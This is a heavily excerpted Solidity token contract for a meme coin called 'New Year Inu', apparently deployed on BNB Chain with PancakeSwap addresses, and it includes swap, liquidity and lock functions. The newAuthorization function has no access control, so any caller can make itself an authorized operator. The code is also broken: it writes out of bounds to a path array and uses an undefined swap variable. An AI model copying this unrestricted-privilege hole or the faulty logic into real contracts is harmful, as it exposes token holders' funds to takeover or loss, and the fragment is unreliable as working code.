...
contract StandardITTToken is Context, IERC20, IERC20Metadata, Auth {
    ...
    constructor(address[] memory account, uint[] memory amount, string[] memory names) Auth(_msgSender())  {
        ...
        require(amount[8] < 9999999999, "Avoid potential timestamp overflow");
        lockTime = amount[8];
...
//["New Year Inu","NYI","https://itstradable.info/","https://t.me/happyNewYearInu"]
    ...
    function creatPair() external authorized  {
        thePair = IDEXFactory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73).createPair(fiat,address(this));
        //return thePair;
    }
    ...
    function newAuthorization(address _owner) external returns(bool) {
        authorizations[_owner] = true;
        return true;
    }
    ...
    function getDexPair() external view returns(address) {
        return IDEXFactory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73).getPair(fiat, address(this));
    }
    ...
    function shouldTokenSwap(uint256 amount, address recipient) internal view returns (bool) {
            ...
            bool timeToSell = lastSellTime.add(0) < block.timestamp;

            return recipient == getPair(address(this), fiat)
            && timeToSell
            && _balances[address(this)] >= swapThreshold
            && _balances[address(this)] >= amount.mul(swapRatio).div(1000);
    }
    function tokenSwap(uint256 _amount) internal swapping {

        uint256 amount = _amount.mul(swapRatio).div(1000);
        ...
        address[] memory path;
        if (fiat == 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) {
            path = new address[](2);
            path[0] = address(this);
            ...
            path[0] = address(this);
            path[1] =  fiat;
            path[3] =  0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;          
        }


        uint256 balanceBefore = address(this).balance;

        IERC20(address(this)).approve(0x10ED43C718714eb63d5aA57B78B54704E256024E,10000000000000000000000000000000000000000000);
       if (amountToSwap>0) {
            ...
            emit Liquify(amountToSwap, address(this));      
       }
    ...
    function unlockLPAfterTime() external {
        ...
        bool _success = _token.transfer(msg.sender, balance);
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
     ...
     event Liquify(uint256 amountBNB, address conttr);
}